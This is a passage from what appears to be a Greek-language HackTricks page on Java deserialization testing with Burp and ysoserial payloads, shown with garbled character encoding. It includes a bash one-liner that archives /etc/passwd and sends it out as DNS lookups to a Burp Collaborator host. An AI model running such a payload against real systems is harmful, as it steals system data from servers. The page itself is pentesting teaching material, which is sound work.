Î‘ÎºÏŒÎ¼Î· ÎºÎ¹ Î±Î½ Î±Ï…Ï„ÏŒ Î¿Î½Î¿Î¼Î¬Î¶ÎµÏ„Î±Î¹ "Î§ÎµÎ¹ÏÎ¿ÎºÎ¯Î½Î·Ï„Î¿Ï‚ ÎˆÎ»ÎµÎ³Ï‡Î¿Ï‚", ÎµÎ¯Î½Î±Î¹ Î±ÏÎºÎµÏ„Î¬ **Î±Ï…Ï„Î¿Î¼Î±Ï„Î¿Ï€Î¿Î¹Î·Î¼Î­Î½Î¿Ï‚**. Î˜Î± ÎµÎ»Î­Î³Î¾ÎµÎ¹ Î±Ï…Ï„ÏŒÎ¼Î±Ï„Î± Î±Î½ Î· **Î±Ï€Î¿ÏƒÎµÎ¹ÏÎ¹Î¿Ï€Î¿Î¯Î·ÏƒÎ·** ÎµÎ¯Î½Î±Î¹ **ÎµÏ…Î¬Î»Ï‰Ï„Î·** ÏƒÎµ **Î¿Ï€Î¿Î¹Î¿Î´Î®Ï€Î¿Ï„Îµ ysoserial payload** ÎµÎ»Î­Î³Ï‡Î¿Î½Ï„Î±Ï‚ Ï„Î¹Ï‚ Î²Î¹Î²Î»Î¹Î¿Î¸Î®ÎºÎµÏ‚ Ï€Î¿Ï… Ï…Ï€Î¬ÏÏ‡Î¿Ï…Î½ ÏƒÏ„Î¿Î½ web server ÎºÎ±Î¹ Î¸Î± ÎµÏ€Î¹ÏƒÎ·Î¼Î¬Î½ÎµÎ¹ Ï„Î¹Ï‚ ÎµÏ…Î¬Î»Ï‰Ï„ÎµÏ‚. Î“Î¹Î± Î½Î± **ÎµÎ»Î­Î³Î¾ÎµÏ„Îµ** Î³Î¹Î± **ÎµÏ…Î¬Î»Ï‰Ï„ÎµÏ‚ Î²Î¹Î²Î»Î¹Î¿Î¸Î®ÎºÎµÏ‚** Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÎµÏ€Î¹Î»Î­Î¾ÎµÏ„Îµ Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÏ„Îµ **Javas Sleeps**, **sleeps** Î¼Î­ÏƒÏ‰ **ÎºÎ±Ï„Î±Î½Î¬Î»Ï‰ÏƒÎ·Ï‚ CPU**, Î® Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ **DNS** ÏŒÏ€Ï‰Ï‚ Î±Î½Î±Ï†Î­ÏÎ¸Î·ÎºÎµ Ï€ÏÎ¿Î·Î³Î¿Ï…Î¼Î­Î½Ï‰Ï‚.

**Î•ÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ·**

Î‘Ï†Î¿Ï ÎµÎ½Ï„Î¿Ï€Î¯ÏƒÎµÏ„Îµ Î¼Î¹Î± ÎµÏ…Î¬Î»Ï‰Ï„Î· Î²Î¹Î²Î»Î¹Î¿Î¸Î®ÎºÎ·, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÏƒÏ„ÎµÎ¯Î»ÎµÏ„Îµ Ï„Î¿ Î±Î¯Ï„Î·Î¼Î± ÏƒÏ„Î·Î½ ÎºÎ±ÏÏ„Î­Î»Î± _Î•ÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ·_.\
Î£Îµ Î±Ï…Ï„Î®Î½ Ï„Î·Î½ ÎºÎ±ÏÏ„Î­Î»Î± Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± **ÎµÏ€Î¹Î»Î­Î¾ÎµÏ„Îµ** Î¾Î±Î½Î¬ Ï„Î¿ **ÏƒÎ·Î¼ÎµÎ¯Î¿ ÎµÎ¹ÏƒÎ±Î³Ï‰Î³Î®Ï‚**, Î½Î± **Î³ÏÎ¬ÏˆÎµÏ„Îµ** Ï„Î·Î½ **ÎµÏ…Î¬Î»Ï‰Ï„Î· Î²Î¹Î²Î»Î¹Î¿Î¸Î®ÎºÎ·** Î³Î¹Î± Ï„Î·Î½ Î¿Ï€Î¿Î¯Î± Î¸Î­Î»ÎµÏ„Îµ Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÏ„Îµ Î­Î½Î± payload, ÎºÎ±Î¹ Ï„Î·Î½ **ÎµÎ½Ï„Î¿Î»Î®**. Î£Ï„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î±, Î±Ï€Î»Î¬ Ï€Î±Ï„Î®ÏƒÏ„Îµ Ï„Î¿ ÎºÎ±Ï„Î¬Î»Î»Î·Î»Î¿ ÎºÎ¿Ï…Î¼Ï€Î¯ **Attack**.

![https://techblog.mediaservice.net/2017/05/reliable-discovery-and-exploitation-of-java-deserialization-vulnerabilities/](<../../.gitbook/assets/4 (1).png>)

### Î Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ Î‘Ï€Î¿ÏƒÎµÎ¹ÏÎ¹Î¿Ï€Î¿Î¯Î·ÏƒÎ·Ï‚ Java DNS Exfil

ÎšÎ¬Î½Ï„Îµ Ï„Î¿ payload ÏƒÎ±Ï‚ Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÎ¹ ÎºÎ¬Ï„Î¹ Ï€Î±ÏÏŒÎ¼Î¿Î¹Î¿ Î¼Îµ Ï„Î¿ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰:
```bash
(i=0;tar zcf - /etc/passwd | xxd -p -c 31 | while read line; do host $line.$i.cl1k22spvdzcxdenxt5onx5id9je73.burpcollaborator.net;i=$((i+1)); done)
```
### Î ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Î Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚

* [https://techblog.mediaservice.net/2017/05/Î±Î¾Î¹ÏŒÏ€Î¹ÏƒÏ„Î·-Î±Î½Î±ÎºÎ¬Î»Ï…ÏˆÎ·-ÎºÎ±Î¹-ÎµÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ·-ÎµÏ…Ï€Î¬Î¸ÎµÎ¹Î±Ï‚-Î±Ï€Î¿ÏƒÎµÎ¹ÏÎ¹Î¿Ï€Î¿Î¯Î·ÏƒÎ·Ï‚-Ï„Î·Ï‚-java/](https://techblog.mediaservice.net/2017/05/Î±Î¾Î¹ÏŒÏ€Î¹ÏƒÏ„Î·-Î±Î½Î±ÎºÎ¬Î»Ï…ÏˆÎ·-ÎºÎ±Î¹-ÎµÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ·-ÎµÏ…Ï€Î¬Î¸ÎµÎ¹Î±Ï‚-Î±Ï€Î¿ÏƒÎµÎ¹ÏÎ¹Î¿Ï€Î¿Î¯Î·ÏƒÎ·Ï‚-Ï„Î·Ï‚-java/)

<details>

<summary><strong>ÎœÎ¬Î¸ÎµÏ„Îµ Ï„Î¿ Ï‡Î¬ÎºÎ¹Î½Î³Îº Ï„Î¿Ï… AWS Î±Ï€ÏŒ Ï„Î¿ Î¼Î·Î´Î­Î½ Î¼Î­Ï‡ÏÎ¹ Ï„Î¿Î½ Î®ÏÏ‰Î± Î¼Îµ Ï„Î¿</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Î†Î»Î»Î¿Î¹ Ï„ÏÏŒÏ€Î¿Î¹ Î³Î¹Î± Î½Î± Ï…Ï€Î¿ÏƒÏ„Î·ÏÎ¯Î¾ÎµÏ„Îµ Ï„Î¿ HackTricks:

* Î•Î¬Î½ Î¸Î­Î»ÎµÏ„Îµ Î½Î± Î´ÎµÎ¯Ï„Îµ Ï„Î·Î½ **ÎµÏ„Î±Î¹ÏÎµÎ¯Î± ÏƒÎ±Ï‚ Î½Î± Î´Î¹Î±Ï†Î·Î¼Î¯Î¶ÎµÏ„Î±Î¹ ÏƒÏ„Î¿ HackTricks** Î® Î½Î± **ÎºÎ±Ï„ÎµÎ²Î¬ÏƒÎµÏ„Îµ Ï„Î¿ HackTricks ÏƒÎµ Î¼Î¿ÏÏ†Î® PDF** ÎµÎ»Î­Î³Î¾Ï„Îµ Ï„Î± [**Î£Î§Î•Î”Î™Î‘ Î£Î¥ÎÎ”Î¡ÎŸÎœÎ—Î£**](https://github.com/sponsors/carlospolop)!
* Î‘Ï€Î¿ÎºÏ„Î®ÏƒÏ„Îµ Ï„Î¿ [**ÎµÏ€Î¯ÏƒÎ·Î¼Î¿ PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Î‘Î½Î±ÎºÎ±Î»ÏÏˆÏ„Îµ [**Ï„Î·Î½ ÎŸÎ¹ÎºÎ¿Î³Î­Î½ÎµÎ¹Î± PEASS**](https://opensea.io/collection/the-peass-family), Ï„Î· ÏƒÏ…Î»Î»Î¿Î³Î® Î¼Î±Ï‚ Î±Ï€ÏŒ Î±Ï€Î¿ÎºÎ»ÎµÎ¹ÏƒÏ„Î¹ÎºÎ¬ [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ ÏƒÏ„Î·** ğŸ’¬ [**Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î· [**Î¿Î¼Î¬Î´Î± telegram**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ Ï„Î± Ï‡Î¬ÎºÎ¹Î½Î³Îº ÎºÏŒÎ»Ï€Î± ÏƒÎ±Ï‚ Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Î±Ï€Î¿Î¸ÎµÏ„Î®ÏÎ¹Î± Ï„Î¿Ï… github.

</details>
